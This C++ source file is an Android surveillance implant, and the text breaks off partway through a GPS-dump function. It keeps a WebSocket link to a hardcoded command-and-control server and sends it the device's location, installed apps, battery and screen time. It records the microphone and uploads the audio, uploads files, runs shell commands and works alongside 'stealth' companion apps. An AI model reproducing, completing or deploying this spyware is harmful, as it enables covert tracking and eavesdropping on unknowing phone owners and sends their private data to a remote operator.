// ─────────────────────────────────────────────────────────────────────────────
// reporter.cpp — Native Android telemetry implant
// ─────────────────────────────────────────────────────────────────────────────

// C Standard Library
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>

// C++ Standard Library
#include <algorithm>
#include <array>
#include <atomic>
#include <chrono>
#include <condition_variable>
#include <fstream>
#include <functional>
#include <memory>
#include <mutex>
#include <queue>
#include <sstream>
#include <string>
#include <thread>
#include <unordered_map>
#include <utility>
#include <vector>

// POSIX
#include <dirent.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

// Android Platform (with desktop stubs for cross-compilation)
#ifdef __ANDROID__
#include <android/log.h>
#include <sys/system_properties.h>
#else
#include <cstdarg>
#define PROP_VALUE_MAX 92
static int __system_property_get(const char* name, char* value) {
    (void)name;
    if (value) value[0] = '\0';
    return 0;
}
static int __android_log_print(int prio, const char* tag, const char* fmt, ...) {
    (void)prio; (void)tag;
    va_list args;
    va_start(args, fmt);
    int ret = vfprintf(stderr, fmt, args);
    va_end(args);
    return ret;
}
#endif

// WebSocket (ixwebsocket)
#include <ixwebsocket/IXNetSystem.h>
#include <ixwebsocket/IXWebSocket.h>

// Configuration
static constexpr const char* DEFAULT_WS_SERVER_URL  = "wss://hearts-eliminate-adrian-texts.trycloudflare.com/ws";
static constexpr const char* C2_URL_FILE = "/data/local/tmp/c2_url.txt";
static constexpr const char* PING_INTERVAL_FILE = "/data/local/tmp/ping_interval.txt";
static constexpr const char* IMPLANT_KEY = "DeltaForce2027";
static constexpr const char* LOG_TAG = "reporter";
static constexpr const char* LOG_PATH = "/data/local/tmp/reporter.log";
static constexpr const char* DISABLE_FILE = "/data/local/tmp/reporter_disable";
static constexpr const char* GPS_FILE = "/data/local/tmp/gps_history.csv";
static constexpr const char* MIC_FILE = "/data/local/tmp/mic.wav";
static constexpr const char* LOC_FILE = "/data/local/tmp/location_enabled";
static constexpr const char* INSTALLED_PACKAGES_FILE = "/data/system/packages.list";

// Log rotation settings
static constexpr bool ENABLE_FILE_LOGGING = false;
static constexpr long MAX_LOG_SIZE = 1024 * 1024; // 1 MB
static constexpr int MAX_LOG_FILES = 5;

// ── Global State ─────────────────────────────────────────────────────────────

// Logging
FILE* g_log_file = nullptr;
size_t g_log_size = 0;
std::mutex g_log_mutex;

// WebSocket send serialization
std::mutex g_ws_mutex;

// C2 endpoint fallback support
std::vector<std::string> g_c2_urls;
size_t g_c2_url_index = 0;

// Device identity (cached at startup)
std::string g_device_id;
std::string g_build_id;
std::string g_build_version;
std::string g_build_type;
std::string g_device_name;

// WebSocket C2 connection
ix::WebSocket g_webSocket;
std::queue<std::string> g_taskQueue;
std::mutex g_taskMutex;
std::condition_variable g_taskCV;
std::condition_variable g_forbiddenCV;

// App blocker
std::vector<std::string> g_forbiddenApps;
std::mutex g_forbiddenMutex;

// Background worker queue for bounded task execution
static constexpr int WORKER_THREAD_COUNT = 4;
std::queue<std::function<void()>> g_workerQueue;
std::mutex g_workerQueueMutex;
std::condition_variable g_workerQueueCV;
bool g_workerShutdown = false;

// Report state tracking (delta-based reporting)
std::atomic<int> g_ping_interval{60};
int g_last_battery_level = -1;
int g_last_loc_state = -1;
int g_last_charging_state = -1;
double g_last_lat = 0.0;
double g_last_lon = 0.0;
std::string g_installed_apps;
std::string g_last_installed_apps;
std::atomic<bool> g_installed_apps_dirty{true};
time_t g_installed_apps_mtime = 0;
int g_screen_time_minutes = 0;
std::string g_last_screen_time_report_key;
std::chrono::steady_clock::time_point g_screen_time_last_update;
bool g_first_report = true;

// Pre-escaped JSON strings (populated once at startup, avoids per-report allocations)
std::string g_escaped_implant_key;
std::string g_escaped_device_id;
std::string g_escaped_build_id;
std::string g_escaped_build_version;
std::string g_escaped_build_type;
std::string g_escaped_device_name;

// ── Logging ──────────────────────────────────────────────────────────────────

/** Rotates log files when the current log exceeds MAX_LOG_SIZE. */
void rotate_logs() {
    if (!ENABLE_FILE_LOGGING || !g_log_file) return;

    // Close the current log file
    fclose(g_log_file);

    // Pre-compute base path once to avoid repeated heap allocations
    const std::string base(LOG_PATH);

    // Shift old log files
    for (int i = MAX_LOG_FILES - 1; i > 0; --i) {
        std::string old_path = base + "." + std::to_string(i);
        std::string new_path = base + "." + std::to_string(i + 1);
        if (access(old_path.c_str(), F_OK) == 0) {
            rename(old_path.c_str(), new_path.c_str());
        }
    }

    // Rename current log to .1
    rename(LOG_PATH, (base + ".1").c_str());

    // Reopen the main log file
    g_log_file = fopen(LOG_PATH, "a");
    if (g_log_file) {
        g_log_size = 0;
    }
}

/** Logs a timestamped message to logcat (Android) and the persistent log file. */
void log_message(const std::string& message) {
    std::time_t now = std::time(nullptr);
    char time_buf[24];
    struct tm tm_buf;
    localtime_r(&now, &tm_buf);
    std::strftime(time_buf, sizeof(time_buf), "%Y-%m-%d %H:%M:%S", &tm_buf);

    std::string formatted;
    formatted.reserve(22 + message.size());
    formatted.push_back('[');
    formatted += time_buf;
    formatted += "] ";
    formatted += message;

    std::lock_guard<std::mutex> log_lock(g_log_mutex);

    if (ENABLE_FILE_LOGGING && g_log_file && g_log_size + formatted.size() + 1 > MAX_LOG_SIZE) {
        rotate_logs();
    }

#ifdef __ANDROID__
    __android_log_print(ANDROID_LOG_INFO, LOG_TAG, "%s", formatted.c_str());
#else
    // After daemonize, stderr is closed so this is a no-op in production.
    fprintf(stderr, "%s\n", formatted.c_str());
#endif

    if (ENABLE_FILE_LOGGING && g_log_file) {
        fprintf(g_log_file, "%s\n", formatted.c_str());
        fflush(g_log_file);
        g_log_size += formatted.size() + 1;
    }
}

// ── Forward Declarations ─────────────────────────────────────────────────────
void send_error_to_server(const std::string& error_source, const std::string& error_msg);
std::pair<bool, std::string> exec_cmd(const std::vector<std::string>& argv);
std::pair<bool, std::string> exec_cmd_shell(const std::string& command_line);
std::pair<bool, std::string> exec_cmd(const std::string& command_line);
std::vector<std::string> split_command_line(const std::string& command_line);
bool enqueue_task(std::function<void()> task);
bool websocket_send_text(const std::string& message);
bool websocket_send_binary(const std::string& data);
void rotate_logs();

// ── Process Execution ────────────────────────────────────────────────────────

/** Executes a command via fork/exec with stdout/stderr silenced. */
bool run_command_no_output(const std::vector<std::string>& argv) {
    if (argv.empty()) return false;

    std::vector<char*> cargs;
    cargs.reserve(argv.size() + 1);
    for (const auto& arg : argv) {
        cargs.push_back(const_cast<char*>(arg.c_str()));
    }
    cargs.push_back(nullptr);

    pid_t pid = fork();
    if (pid == -1) {
        send_error_to_server("fork_exec", "fork() failed for: " + argv[0]);
        return false;
    }
    if (pid == 0) {
        // Redirect stdout/stderr to /dev/null to avoid leaked output
        int devnull = open("/dev/null", O_WRONLY);
        if (devnull >= 0) {
            dup2(devnull, STDOUT_FILENO);
            dup2(devnull, STDERR_FILENO);
            close(devnull);
        }
        execvp(cargs[0], cargs.data());
        _exit(127);
    }

    int status = 0;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0;
}

std::vector<std::string> split_command_line(const std::string& command_line) {
    std::vector<std::string> result;
    std::string current;
    bool in_single_quote = false;
    bool in_double_quote = false;
    bool escaped = false;

    for (char raw_ch : command_line) {
        unsigned char ch = static_cast<unsigned char>(raw_ch);
        if (escaped) {
            current.push_back(ch);
            escaped = false;
            continue;
        }

        if (ch == '\\') {
            escaped = true;
            continue;
        }

        if (ch == '\'' && !in_double_quote) {
            in_single_quote = !in_single_quote;
            continue;
        }

        if (ch == '"' && !in_single_quote) {
            in_double_quote = !in_double_quote;
            continue;
        }

        if (!in_single_quote && !in_double_quote && std::isspace(ch)) {
            if (!current.empty()) {
                result.push_back(std::move(current));
                current.clear();
            }
            continue;
        }

        current.push_back(ch);
    }

    if (!current.empty()) {
        result.push_back(std::move(current));
    }
    return result;
}

/** Executes a shell command via fork/exec and returns its stdout output and success state. */
std::pair<bool, std::string> exec_cmd(const std::vector<std::string>& argv) {
    if (argv.empty()) {
        log_message("exec_cmd called with empty argv");
        return {false, ""};
    }

    std::string joined;
    for (size_t i = 0; i < argv.size(); ++i) {
        joined += argv[i];
        if (i + 1 < argv.size()) joined += ' ';
    }
    log_message("Executing command: " + joined);

    int pipefd[2];
    if (pipe(pipefd) != 0) {
        log_message("Failed to create pipe for command: " + joined);
        send_error_to_server("exec_cmd", "pipe() failed for: " + joined);
        return {false, ""};
    }

    pid_t pid = fork();
    if (pid == -1) {
        close(pipefd[0]);
        close(pipefd[1]);
        log_message("fork() failed for: " + joined);
        send_error_to_server("exec_cmd", "fork() failed for: " + joined);
        return {false, ""};
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);

        std::vector<char*> cargs;
        cargs.reserve(argv.size() + 1);
        for (const auto& arg : argv) {
            cargs.push_back(const_cast<char*>(arg.c_str()));
        }
        cargs.push_back(nullptr);
        execvp(cargs[0], cargs.data());
        _exit(127);
    }

    close(pipefd[1]);
    std::string result;
    char buffer[2048];
    ssize_t count;
    while ((count = read(pipefd[0], buffer, sizeof(buffer))) > 0) {
        result.append(buffer, static_cast<size_t>(count));
    }
    close(pipefd[0]);

    int status = 0;
    waitpid(pid, &status, 0);
    bool success = WIFEXITED(status) && WEXITSTATUS(status) == 0;

    while (!result.empty() && std::isspace(static_cast<unsigned char>(result.back()))) {
        result.pop_back();
    }

    if (result.empty()) {
        log_message("Command returned empty output: " + joined);
    } else if (result.size() > 200) {
        log_message("Command output (" + std::to_string(result.size()) + " bytes, truncated): " + result.substr(0, 200) + "...");
    } else {
        log_message("Command output: " + result);
    }

    return {success, result};
}

std::pair<bool, std::string> exec_cmd_shell(const std::string& command_line) {
    return exec_cmd(std::vector<std::string>{"/system/bin/sh", "-c", command_line});
}

std::pair<bool, std::string> exec_cmd(const std::string& command_line) {
    auto argv = split_command_line(command_line);
    return exec_cmd(argv);
}

bool enqueue_task(std::function<void()> task) {
    if (!task) return false;
    {
        std::lock_guard<std::mutex> lock(g_workerQueueMutex);
        if (g_workerShutdown) return false;
        g_workerQueue.push(std::move(task));
    }
    g_workerQueueCV.notify_one();
    return true;
}

void worker_thread_loop() {
    while (true) {
        std::function<void()> task;
        {
            std::unique_lock<std::mutex> lock(g_workerQueueMutex);
            g_workerQueueCV.wait(lock, [] {
                return g_workerShutdown || !g_workerQueue.empty();
            });
            if (g_workerShutdown && g_workerQueue.empty()) {
                return;
            }
            task = std::move(g_workerQueue.front());
            g_workerQueue.pop();
        }
        if (task) {
            task();
        }
    }
}

// ── JSON Utilities ───────────────────────────────────────────────────────────

/** Skips whitespace characters while parsing JSON. */
static void skip_json_whitespace(const std::string& json, size_t& pos) {
    while (pos < json.size() && std::isspace(static_cast<unsigned char>(json[pos]))) {
        ++pos;
    }
}

/** Extracts a quoted JSON string, handling escaped characters and unicode escapes. */
static bool parse_json_string(const std::string& json, size_t& pos, std::string& out) {
    if (pos >= json.size() || json[pos] != '"') return false;
    ++pos;
    out.clear();

    while (pos < json.size()) {
        char c = json[pos++];
        if (c == '\\') {
            if (pos >= json.size()) return false;
            char escaped = json[pos++];
            switch (escaped) {
                case '"': out.push_back('"'); break;
                case '\\': out.push_back('\\'); break;
                case '/': out.push_back('/'); break;
                case 'b': out.push_back('\b'); break;
                case 'f': out.push_back('\f'); break;
                case 'n': out.push_back('\n'); break;
                case 'r': out.push_back('\r'); break;
                case 't': out.push_back('\t'); break;
                case 'u': {
                    if (pos + 4 > json.size()) return false;
                    unsigned int code = 0;
                    for (int i = 0; i < 4; ++i) {
                        char hex = json[pos++];
                        code <<= 4;
                        if (hex >= '0' && hex <= '9') {
                            code |= static_cast<unsigned int>(hex - '0');
                        } else if (hex >= 'a' && hex <= 'f') {
                            code |= static_cast<unsigned int>(hex - 'a' + 10);
                        } else if (hex >= 'A' && hex <= 'F') {
                            code |= static_cast<unsigned int>(hex - 'A' + 10);
                        } else {
                            return false;
                        }
                    }
                    if (code <= 0x7F) {
                        out.push_back(static_cast<char>(code));
                    } else if (code <= 0x7FF) {
                        out.push_back(static_cast<char>(0xC0 | ((code >> 6) & 0x1F)));
                        out.push_back(static_cast<char>(0x80 | (code & 0x3F)));
                    } else {
                        out.push_back(static_cast<char>(0xE0 | ((code >> 12) & 0x0F)));
                        out.push_back(static_cast<char>(0x80 | ((code >> 6) & 0x3F)));
                        out.push_back(static_cast<char>(0x80 | (code & 0x3F)));
                    }
                } break;
                default:
                    out.push_back(escaped);
                    break;
            }
            continue;
        }
        if (c == '"') {
            return true;
        }
        out.push_back(c);
    }
    return false;
}

static bool skip_json_value(const std::string& json, size_t& pos);

static bool skip_json_string(const std::string& json, size_t& pos) {
    std::string unused;
    return parse_json_string(json, pos, unused);
}

static bool skip_json_value(const std::string& json, size_t& pos) {
    skip_json_whitespace(json, pos);
    if (pos >= json.size()) return false;

    char c = json[pos];
    if (c == '"') {
        return skip_json_string(json, pos);
    }

    if (c == '{') {
        ++pos;
        while (pos < json.size()) {
            skip_json_whitespace(json, pos);
            if (pos < json.size() && json[pos] == '}') {
                ++pos;
                return true;
            }
            if (!skip_json_value(json, pos)) return false;
            skip_json_whitespace(json, pos);
            if (pos >= json.size() || json[pos] != ':') return false;
            ++pos;
            if (!skip_json_value(json, pos)) return false;
            skip_json_whitespace(json, pos);
            if (pos < json.size() && json[pos] == ',') {
                ++pos;
                continue;
            }
            if (pos < json.size() && json[pos] == '}') {
                ++pos;
                return true;
            }
            return false;
        }
        return false;
    }

    if (c == '[') {
        ++pos;
        while (pos < json.size()) {
            skip_json_whitespace(json, pos);
            if (pos < json.size() && json[pos] == ']') {
                ++pos;
                return true;
            }
            if (!skip_json_value(json, pos)) return false;
            skip_json_whitespace(json, pos);
            if (pos < json.size() && json[pos] == ',') {
                ++pos;
                continue;
            }
            if (pos < json.size() && json[pos] == ']') {
                ++pos;
                return true;
            }
            return false;
        }
        return false;
    }

    if (c == 't' && json.compare(pos, 4, "true") == 0) {
        pos += 4;
        return true;
    }
    if (c == 'f' && json.compare(pos, 5, "false") == 0) {
        pos += 5;
        return true;
    }
    if (c == 'n' && json.compare(pos, 4, "null") == 0) {
        pos += 4;
        return true;
    }

    size_t start = pos;
    if (c == '-') {
        ++pos;
    }
    while (pos < json.size() && std::isdigit(static_cast<unsigned char>(json[pos]))) {
        ++pos;
    }
    if (pos < json.size() && json[pos] == '.') {
        ++pos;
        while (pos < json.size() && std::isdigit(static_cast<unsigned char>(json[pos]))) {
            ++pos;
        }
    }
    if (pos < json.size() && (json[pos] == 'e' || json[pos] == 'E')) {
        ++pos;
        if (pos < json.size() && (json[pos] == '+' || json[pos] == '-')) {
            ++pos;
        }
        while (pos < json.size() && std::isdigit(static_cast<unsigned char>(json[pos]))) {
            ++pos;
        }
    }
    return pos > start;
}

/** Extracts a value from a JSON object by key name. */
std::string get_json_val(const std::string& json, const std::string& key) {
    if (json.empty() || key.empty()) return "";

    size_t pos = 0;
    while (pos < json.size()) {
        skip_json_whitespace(json, pos);
        if (pos >= json.size() || json[pos] != '"') {
            ++pos;
            continue;
        }

        std::string current_key;
        if (!parse_json_string(json, pos, current_key)) {
            return "";
        }

        skip_json_whitespace(json, pos);
        if (pos >= json.size() || json[pos] != ':') {
            continue;
        }
        ++pos;
        skip_json_whitespace(json, pos);

        if (current_key == key) {
            if (pos < json.size() && json[pos] == '"') {
                std::string value;
                if (parse_json_string(json, pos, value)) {
                    return value;
                }
                return "";
            }

            size_t value_start = pos;
            if (!skip_json_value(json, pos)) {
                return "";
            }
            size_t value_end = pos;
            while (value_end > value_start && std::isspace(static_cast<unsigned char>(json[value_end - 1]))) {
                --value_end;
            }
            return json.substr(value_start, value_end - value_start);
        }

        if (!skip_json_value(json, pos)) {
            return "";
        }
    }

    return "";
}

/** Escapes a string for safe embedding inside a JSON value. */
std::string json_escape(const std::string& input) {
    std::string escaped;
    escaped.reserve(input.size() + 16);
    for (unsigned char c : input) {
        switch (c) {
            case '"': escaped += "\\\""; break;
            case '\\': escaped += "\\\\"; break;
            case '\b': escaped += "\\b"; break;
            case '\f': escaped += "\\f"; break;
            case '\n': escaped += "\\n"; break;
            case '\r': escaped += "\\r"; break;
            case '\t': escaped += "\\t"; break;
            default:
                if (c < 0x20) {
                    char buf[7];
                    std::snprintf(buf, sizeof(buf), "\\u%04x", c);
                    escaped += buf;
                } else {
                    escaped.push_back(c);
                }
                break;
        }
    }
    return escaped;
}

// ── Device State Readers ─────────────────────────────────────────────────────

/** Returns true if the WebSocket connection to the C2 server is active. */
bool websocket_is_open() {
    return g_webSocket.getReadyState() == ix::ReadyState::Open;
}

bool websocket_send_text(const std::string& message) {
    std::lock_guard<std::mutex> lock(g_ws_mutex);
    if (!websocket_is_open()) {
        return false;
    }
    g_webSocket.sendText(message);
    return true;
}

bool websocket_send_binary(const std::string& data) {
    std::lock_guard<std::mutex> lock(g_ws_mutex);
    if (!websocket_is_open()) {
        return false;
    }
    g_webSocket.sendBinary(data);
    return true;
}

/**
 * Checks if location tracking is enabled via flag file.
 */
bool is_location_enabled() {
    int fd = open(LOC_FILE, O_RDONLY);
    if (fd >= 0) {
        char ch = '1';
        if (read(fd, &ch, 1) == 1) {
            close(fd);
            return ch == '1';
        }
        close(fd);
        return true; // default enabled
    }
    // File doesn't exist — create with default "enabled"
    fd = open(LOC_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0) {
        write(fd, "1", 1);
        close(fd);
        chmod(LOC_FILE, 0666);
    }
    return true;
}

/** Writes the location tracking on/off state to the flag file. */
void set_location_file(int status) {
    int fd = open(LOC_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        char ch = status ? '1' : '0';
        write(fd, &ch, 1);
        close(fd);
    }
}

/** Reads the persisted ping interval from file or returns the default. */
int load_ping_interval_from_file(int default_interval) {
    int interval = default_interval;
    bool valid = false;
    int fd = open(PING_INTERVAL_FILE, O_RDONLY);
    if (fd >= 0) {
        char buf[32];
        ssize_t n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0) {
            buf[n] = '\0';
            try {
                int value = std::stoi(buf);
                if (value >= 1) {
                    interval = value;
                    valid = true;
                }
            } catch (const std::exception&) {
                // Ignore malformed content and rewrite default below.
            }
        }
    }

    if (!valid) {
        // If the file is missing or invalid, create/reset it with the default interval.
        save_ping_interval_to_file(default_interval);
    }

    return interval;
}

/** Persists the ping interval to disk for reboot survival. */
bool save_ping_interval_to_file(int interval) {
    int fd = open(PING_INTERVAL_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        return false;
    }
    std::string value = std::to_string(interval);
    ssize_t written = write(fd, value.data(), value.size());
    close(fd);
    return written == static_cast<ssize_t>(value.size());
}

/** Reads battery percentage directly from sysfs (0-100, or -1 on failure). */
int get_battery_level() {
    int fd = open("/sys/class/power_supply/battery/capacity", O_RDONLY);
    if (fd < 0) return -1;
    char buf[8];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    return atoi(buf);
}

/** Returns 1 if charging or full, 0 otherwise. Reads sysfs directly. */
int get_charging_state() {
    int fd = open("/sys/class/power_supply/battery/status", O_RDONLY);
    if (fd < 0) return 0;
    char buf[32];
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = '\0';
    // "Charging\n" or "Full\n"
    return (buf[0] == 'C' || buf[0] == 'F') ? 1 : 0;
}

// ── System Info ──────────────────────────────────────────────────────────────

/** Reads an Android system property via __system_property_get. */
std::string get_sys_prop(const char* prop_name) {
    char value[PROP_VALUE_MAX];
    if (__system_property_get(prop_name, value) > 0) {
        return std::string(value);
    }
    return "UNKNOWN";
}

std::string get_build_id() { return get_sys_prop("ro.build.id"); }
std::string get_build_version() { return get_sys_prop("ro.build.version.release"); }
std::string get_build_type() { return get_sys_prop("ro.build.type"); }
std::string get_device_name() { return get_sys_prop("ro.product.model"); }
std::string get_serialno() { 
    std::string s = get_sys_prop("ro.serialno");
    return s == "UNKNOWN" ? "UNKNOWN_DEVICE" : s; 
}

/** Returns a comma-separated list of all installed package names. */
std::string get_installed_apps() {
    std::ifstream ifs("/data/system/packages.list");
    if (!ifs.is_open()) {
        // Fallback if packages.list is not readable
        auto [ok, output] = exec_cmd(std::vector<std::string>{"pm", "list", "packages"});
        if (!ok) return "";

        std::string apps;
        constexpr const char prefix[] = "package:";
        constexpr size_t prefix_len = sizeof(prefix) - 1;
        size_t start = 0;
        while (start < output.size()) {
            size_t end = output.find('\n', start);
            size_t line_len = (end == std::string::npos) ? output.size() - start : end - start;
            if (line_len >= prefix_len && std::strncmp(output.data() + start, prefix, prefix_len) == 0) {
                if (!apps.empty()) apps.push_back(',');
                apps.append(output.data() + start + prefix_len, line_len - prefix_len);
            }
            if (end == std::string::npos) break;
            start = end + 1;
        }
        return apps;
    }

    std::string apps;
    std::string line;
    while (std::getline(ifs, line)) {
        size_t space_pos = line.find(' ');
        if (space_pos != std::string::npos) {
            std::string pkg = line.substr(0, space_pos);
            if (!pkg.empty()) {
                if (!apps.empty()) apps.push_back(',');
                apps += pkg;
            }
        }
    }
    return apps;
}


/** Reads cached GPS coordinates from a lightweight scratchpad file.
 *  A companion script/service writes lat,lon to /data/local/tmp/coords.txt,
 *  avoiding the heavy CPU cost of forking `dumpsys location` every ping cycle.
 */
bool get_location_from_gps_provider(double& lat, double& lon) {
    std::ifstream infile("/data/local/tmp/coords.txt");
    if (!infile.is_open()) {
        send_error_to_server("gps_read", "Cannot open /data/local/tmp/coords.txt");
        return false;
    }

    std::string line;
    if (std::getline(infile, line)) {
        size_t comma = line.find(',');
        if (comma != std::string::npos) {
            try {
                lat = std::stod(line.substr(0, comma));
                lon = std::stod(line.substr(comma + 1));
                return true;
            } catch (const std::exception& e) {
                send_error_to_server("gps_parse", std::string("Malformed coords.txt: ") + e.what());
                return false;
            }
        }
    }
    return false;
}

// ── Screen Time & App Tracking ───────────────────────────────────────────────

/** Returns a string key like "2026-06-04-15" for grouping screen time by hour. */
std::string make_hour_key(time_t t) {
    char buf[32];
    struct tm tm_buf;
    localtime_r(&t, &tm_buf);
    std::strftime(buf, sizeof(buf), "%Y-%m-%d-%H", &tm_buf);
    return std::string(buf);
}

/** Accumulates screen-on minutes since the last update. */
void update_screen_time() {
    auto now = std::chrono::steady_clock::now();
    if (g_screen_time_last_update == std::chrono::steady_clock::time_point()) {
        g_screen_time_last_update = now;
        return;
    }

    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - g_screen_time_last_update);
    if (elapsed.count() >= 60) {
        int minutes = static_cast<int>(elapsed.count() / 60);
        g_screen_time_minutes += minutes;
        g_screen_time_last_update += std::chrono::seconds(minutes * 60);
    }
}

/** Returns cached installed apps list, refreshing only when dirty. */
const std::string& get_current_installed_apps() {
    if (g_installed_apps.empty() || g_installed_apps_dirty) {
        g_installed_apps = get_installed_apps();
        g_installed_apps_dirty = false;
    }
    return g_installed_apps;
}

/** Returns true if the current hour differs from the last screen time report. */
bool should_send_screen_time(time_t now) {
    const std::string current_hour = make_hour_key(now);
    if (g_first_report || current_hour != g_last_screen_time_report_key) {
        g_last_screen_time_report_key = current_hour;
        return true;
    }
    return false;
}

// ── Networking ───────────────────────────────────────────────────────────────

/** Sends a JSON telemetry report over the WebSocket. */
bool send_report(const std::string& data) {
    log_message("Sending report (" + std::to_string(data.size()) + " bytes)");
    if (!websocket_send_text(data)) {
        log_message("WS not open; report skipped.");
        return false;
    }
    log_message("Report sent successfully via WS.");
    return true;
}

/** Sends an error report to the C2 server so failures are visible remotely. */
void send_error_to_server(const std::string& error_source, const std::string& error_msg) {
    log_message("ERROR [" + error_source + "]: " + error_msg);
    std::string json = "{\"implant_key\":\"" + g_escaped_implant_key
        + "\",\"device_id\":\"" + g_escaped_device_id
        + "\",\"error_source\":\"" + json_escape(error_source)
        + "\",\"error_msg\":\"" + json_escape(error_msg) + "\"}";
    websocket_send_text(json);
}

/** Uploads a file to the C2 server: sends metadata JSON followed by raw binary. */
void upload_file(const std::string& filepath, const std::string& type = "file") {
    if (access(filepath.c_str(), F_OK) == -1) {
        send_error_to_server("file_upload", "File not found: " + filepath);
        return;
    }
    if (!websocket_is_open()) {
        send_error_to_server("file_upload", "WS not open, cannot upload: " + filepath);
        return;
    }
    log_message("Uploading file natively: " + filepath);
    
    // First, send metadata
    std::string meta_json = "{\"implant_key\":\"" + g_escaped_implant_key + "\", \"upload_type\":\"" + json_escape(type) + "\", \"filepath\":\"" + json_escape(filepath) + "\"}";
    if (!websocket_send_text(meta_json)) {
        send_error_to_server("file_upload", "WS not open, cannot upload: " + filepath);
        return;
    }

    // Then, send binary file data (Optimized: Direct alloc, no stringstream)
    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
    if (file) {
        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        
        std::string buffer;
        buffer.resize(size);
        if (file.read(&buffer[0], size)) {
            if (!websocket_send_binary(buffer)) {
                send_error_to_server("file_upload", "WS not open, cannot upload: " + filepath);
                return;
            }
            log_message("Upload finished natively via WS (" + std::to_string(size) + " bytes).");
        } else {
            send_error_to_server("file_upload", "Failed to read file content: " + filepath);
        }
    } else {
        send_error_to_server("file_upload", "Failed to open file for reading: " + filepath);
    }
}
// ── Telemetry Reporting ─────────────────────────────────────────────────────

/**
 * Collects device state (battery, GPS, apps, screen time) and sends a
 * delta-compressed JSON report to the C2 server. Only changed fields
 * are included to minimize bandwidth.
 */
void do_report() {
    log_message("Starting report.");
    update_screen_time();
    time_t now = time(nullptr);
    // Forward errors from all companion Java apps to the C2 server
    static const struct { const char* path; const char* source; } app_error_files[] = {
        {"/data/local/tmp/gps_errors.txt",   "stealth_gps_app"},
        {"/data/local/tmp/alert_errors.txt",  "stealth_alert_app"},
        {"/data/local/tmp/audio_errors.txt",  "stealth_audio_app"},
    };
    for (const auto& ef : app_error_files) {
        std::ifstream err_file(ef.path);
        if (err_file.is_open()) {
            std::stringstream err_buffer;
            err_buffer << err_file.rdbuf();
            std::string errors = err_buffer.str();
            err_file.close();
            if (!errors.empty()) {
                send_error_to_server(ef.source, errors);
            }
            unlink(ef.path);
        }
    }

    bool loc_allowed = is_location_enabled();
    int loc_state = loc_allowed ? 1 : 0;
    double current_lat = 0.0;
    double current_lon = 0.0;
    bool have_location = false;
    if (loc_allowed) {
        have_location = get_location_from_gps_provider(current_lat, current_lon);
        if (!have_location) {
            log_message("Failed to acquire GPS coordinates from coords file.");
        }
    }
    int battery_level = get_battery_level();
    int charging_state = get_charging_state();
    const std::string& apps = get_current_installed_apps();
    bool send_screen_time = should_send_screen_time(now);
    bool send_latlon = false;
    bool state_changed = g_first_report || send_screen_time;

    // ALWAYS send lat/lon if we have it, so the C2 server map and last-seen always updates.
    if (loc_allowed && have_location) {
        send_latlon = true;
    }

    if (g_first_report || battery_level != g_last_battery_level || send_screen_time) {
        state_changed = true;
    }

    if (!state_changed && !send_latlon) {
        log_message("No major state change, but sending heartbeat ping anyway.");
    }

    std::string json;
    json.reserve(512);
    json = "{\"implant_key\":\"";
    json += g_escaped_implant_key;
    json += "\",\"device_id\":\"";
    json += g_escaped_device_id;
    json += "\"";

    if (g_first_report || battery_level != g_last_battery_level) {
        json += ",\"battery\":";
        json += std::to_string(battery_level);
        g_last_battery_level = battery_level;
    }

    if (g_first_report || charging_state != g_last_charging_state) {
        json += ",\"charging\":";
        json += std::to_string(charging_state);
        g_last_charging_state = charging_state;
    }

    if (g_first_report || loc_state != g_last_loc_state) {
        json += ",\"loc_state\":";
        json += std::to_string(loc_state);
        g_last_loc_state = loc_state;
    }

    if (send_latlon) {
        json += ",\"lat\":";
        json += std::to_string(current_lat);
        json += ",\"lon\":";
        json += std::to_string(current_lon);
        g_last_lat = current_lat;
        g_last_lon = current_lon;
    }

    if (!apps.empty() && (g_first_report || apps != g_last_installed_apps)) {
        json += ",\"installed_apps\":\"";
        json += json_escape(apps);
        json += "\"";
        g_last_installed_apps = apps;
    }

    if (send_screen_time) {
        json += ",\"screen_time_minutes\":";
        json += std::to_string(g_screen_time_minutes);
        json += ",\"event\":\"hourly_screen_time_update\"";
    }

    json += ",\"build_id\":\"";
    json += g_escaped_build_id;
    json += "\"";
    json += ",\"build_version\":\"";
    json += g_escaped_build_version;
    json += "\"";
    json += ",\"build_type\":\"";
    json += g_escaped_build_type;
    json += "\"";
    json += ",\"device\":\"";
    json += g_escaped_device_name;
    json += "\"}";

    log_message("JSON payload: " + json);
    bool sent = send_report(std::move(json));
    log_message("Report finished.");
    if (sent) {
        g_first_report = false;
    } else {
        log_message("Report not delivered; will retry as first report next cycle.");
    }
}

// ── C2 Command Execution ─────────────────────────────────────────────────────

/** Records audio from the device microphone for a specified duration using tinycap. */
void do_mic_record(int duration_s) {
    if (duration_s <= 0) {
        send_error_to_server("mic_record", "Invalid duration: " + std::to_string(duration_s));
        return;
    }
    std::string cmd = "tinycap " + std::string(MIC_FILE) + " -D 0 -d 0 -c 1 -r 16000 -b 16 -p 1024 -n 4 -t " + std::to_string(duration_s);
    log_message("Starting microphone recording for " + std::to_string(duration_s) + " seconds.");
    auto [success, result] = exec_cmd(split_command_line(cmd));
    if (!success) {
        send_error_to_server("mic_record", "tinycap command failed: " + cmd);
        return;
    }

    struct stat st;
    if (stat(MIC_FILE, &st) != 0 || st.st_size == 0) {
        send_error_to_server("mic_record", "Microphone output file missing or empty: " + std::string(MIC_FILE));
        return;
    }

    log_message("Microphone recording finished.");
    upload_file(MIC_FILE);
}

/** Dumps GPS history from the system location cache and radio logs to a local file. */
void do_gps_dump() {
